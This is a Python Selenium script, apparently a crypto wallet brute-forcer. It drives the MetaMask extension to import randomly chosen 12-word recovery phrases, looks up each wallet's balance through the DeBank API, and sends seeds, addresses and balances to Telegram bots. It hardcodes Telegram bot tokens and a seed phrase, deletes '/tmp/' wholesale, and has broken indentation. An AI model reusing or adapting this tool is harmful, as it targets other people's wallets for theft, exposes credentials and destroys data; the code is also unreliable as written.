import os
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
#import pyperclip
#import clipboard
import time
import telegram
import shutil
import json, requests
import subprocess
import gc

def crawling(request):
#seed file 불러오기
file_path="2048.txt"
with open(file_path, encoding='utf-8-sig') as f:
    lines=f.readlines()
lines = [line.replace('\n', ' ') for line in lines]


#텔레그램 알림
bot_token = '5349066419:AAEQCf4eS-JsTChppF2BnEpE4-bJBrYTt4o'
bot = telegram.Bot(token=bot_token)
chat_id1 = 1575864888
bot1_token = '5277782966:AAHrE3QzfZvYaTfS4IhFdWXq6G3GQmtG-t0'
bot1 = telegram.Bot(token=bot1_token)
chat_id2 = 1575864888
bot_add_token = '5309665527:AAHm2XySwuyj3OSl3fQyw_k1rtO9uc6ijfo'
bot_add = telegram.Bot(token=bot_add_token)
chat_id_add = 1575864888

while True :
   try :
        #os.system('rammap.lnk')
        time.sleep(1)
        options = webdriver.FirefoxOptions()
        print('done')
        os.environ['MOZ_HEADLESS'] ='1'
        options.add_argument('window-size=1400,600"')
        driver = webdriver.Firefox()
        extension_path ="metamask.xpi"
        driver.install_addon(extension_path, temporary=True)
        driver.get('about:addons')
        driver.set_window_size(1920,1080)
        print('done')

        #Wait until browser loaded
        driver.implicitly_wait(20)
        driver.switch_to.window(driver.window_handles[1])
        print('loaded')
        # 로그인 셋팅
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/button')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/button').click()
        print('login set')
        # from Wallet
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[2]/div[1]/button')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[2]/div[1]/button').click()
        print('from wallet done')
        # Agree
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/div[5]/div[1]/footer/button[2]')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div/div[5]/div[1]/footer/button[2]').click()
        print('agreed')

        # Initial Seed Input
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="import-srp__srp-word-0"]')))
        initial_seed= ['nephew', 'dove', 'census', 'tilt', 'sniff', 'celery', 'hint', 'over', 'disorder', 'huge', 'shine', 'since']
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-0"]').send_keys(initial_seed[0])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-1"]').send_keys(initial_seed[1])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-2"]').send_keys(initial_seed[2])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-3"]').send_keys(initial_seed[3])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-4"]').send_keys(initial_seed[4])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-5"]').send_keys(initial_seed[5])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-6"]').send_keys(initial_seed[6])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-7"]').send_keys(initial_seed[7])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-8"]').send_keys(initial_seed[8])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-9"]').send_keys(initial_seed[9])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-10"]').send_keys(initial_seed[10])
        driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-11"]').send_keys(initial_seed[11])

        driver.find_element(By.XPATH, '//*[@id="password"]').send_keys('12345678')
        driver.find_element(By.XPATH, '//*[@id="confirm-password"]').send_keys('12345678')
        driver.find_element(By.XPATH, '//*[@id="create-new-vault__terms-checkbox"]').click()

        # Initial log in
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div[2]/form/button')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/div[2]/form/button').click()

        # Complete Login
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[2]/div/div/button')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div/div/button').click()

        # Close New News
        time.sleep(1)
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div/div/section/div[1]/div/button')))
        driver.find_element(By.XPATH, '/html/body/div[2]/div/div/section/div[1]/div/button').click()

        # Profile Click
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/div/div[2]/div[2]/div')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div[2]/div[2]/div').click()

        # Lock
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div[2]/button')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div[2]/button').click()

        # Forget Password
        wait = WebDriverWait(driver, 10)
        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[3]/a')))
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[3]/a').click()
        print("ready")

        # 검색 시작
        time.sleep(2)
        counter = 0
        while counter < 200:

            seed = random.sample(lines, 12)
            wait = WebDriverWait(driver, 10)
            element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="import-srp__srp-word-0"]')))

            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-0"]').send_keys(seed[0])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-1"]').send_keys(seed[1])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-2"]').send_keys(seed[2])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-3"]').send_keys(seed[3])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-4"]').send_keys(seed[4])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-5"]').send_keys(seed[5])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-6"]').send_keys(seed[6])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-7"]').send_keys(seed[7])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-8"]').send_keys(seed[8])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-9"]').send_keys(seed[9])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-10"]').send_keys(seed[10])
            driver.find_element(By.XPATH, '//*[@id="import-srp__srp-word-11"]').send_keys(seed[11])

            driver.find_element(By.XPATH, '//*[@id="password"]').send_keys('12345678')
            driver.find_element(By.XPATH, '//*[@id="confirm-password"]').send_keys('12345678')

            try:
                driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/form/button').click()
                #지갑 주소 클릭
                #wait = WebDriverWait(driver, 10)
                #element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div/div/button')))
                #driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div/div/button').click()

                # 점 3개 클릭
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[1]/button')))
                driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[1]/button').click()

                # 세부정보보기 클릭 
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/button[2]')))
                driver.find_element(By.XPATH, '/html/body/div[2]/div[2]/button[2]').click()

                # 지갑 주소 복시
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/span/div[1]/div/div/div/div[3]/div[2]/div/div/div[1]')))
                address = driver.find_element(By.XPATH, '/html/body/div[1]/div/span/div[1]/div/div/div/div[3]/div[2]/div/div/div[1]').text

                #세부정보 닫기
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/span/div[1]/div/div/div/button[1]')))
                driver.find_element(By.XPATH, '/html/body/div[1]/div/span/div[1]/div/div/div/button[1]').click()

                print("found!")
                                #address = pyperclip.paste()
                #address = clipboard.paste()

                #print("address copied!")
                #debank = "https://openapi.debank.com/v1/user/total_balance?id="
                #new_address = debank + address
                #driver.execute_script('window.open("about:blank","_blank");')
                #time.sleep(1)
                #driver.switch_to.window(driver.window_handles[-1])
                #driver.get(new_address)
                #driver.implicitly_wait(10)
                #time.sleep(4)
                #driver.close()
                # driver.switch_to.window(driver.window_handles[-1])

                # amount check in debank
                debank = "https://openapi.debank.com/v1/user/total_balance?id="
                new_address = debank + address
                #new_address = debank + '0xdb9d281c3d29baa9587f5dac99dd982156913913'    # test address
                url = requests.get(new_address)
                time.sleep(1)
                text = url.text
                data = json.loads(text)
                Amount = data['total_usd_value']


                # amount 확인
                #wait = WebDriverWait(driver, 10)
                #element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[1]/div/div/div/div[2]/span[1]')))
                #Amount = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[1]/div/div/div/div[2]/span[1]').text


                if not Amount == 0:
                    bot1.sendMessage(chat_id=chat_id2, text=seed)
                    bot1.sendMessage(chat_id=chat_id2, text=address)
                    bot1.sendMessage(chat_id=chat_id2, text=Amount)
                    bot.sendMessage(chat_id=chat_id1, text=seed)
                    bot.sendMessage(chat_id=chat_id1, text=address)
                    bot.sendMessage(chat_id=chat_id1, text=Amount)
                    bot_add.sendMessage(chat_id=chat_id_add, text=address)
                    print(seed)
                    print(address)
                    print(Amount)

                else:
                    bot.sendMessage(chat_id=chat_id1, text=seed)
                    bot.sendMessage(chat_id=chat_id1, text=address)
                    bot.sendMessage(chat_id=chat_id1, text=Amount)
                    bot_add.sendMessage(chat_id=chat_id_add, text=address)
                    print(seed)
                    print(address)
                    print(Amount)


                # Profile Click
                driver.implicitly_wait(5)
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[1]/div/div[2]/div[2]/div')))
                driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div[2]/div[2]/div').click()

                # Lock
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div[2]/button')))
                driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div[2]/button').click()

                # Forget Password
                wait = WebDriverWait(driver, 10)
                element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[3]/a')))
                driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[3]/a').click()
                counter = counter + 1
                print(counter)

            except :
                driver.back()  # 뒤로가기
                driver.forward()  # 앞으로 가기
                counter = counter + 1
                print(seed)
                print(counter)

        shutil.rmtree('/tmp/')
        time.sleep(2)
        driver.quit()
        os.remove('geckodriver.log')
        os.remove('1.log')
        #subprocess('TASKKILL /IM geckodriver')
        del seed, address, new_address, Amount, driver
        
   except :
        print('reset')
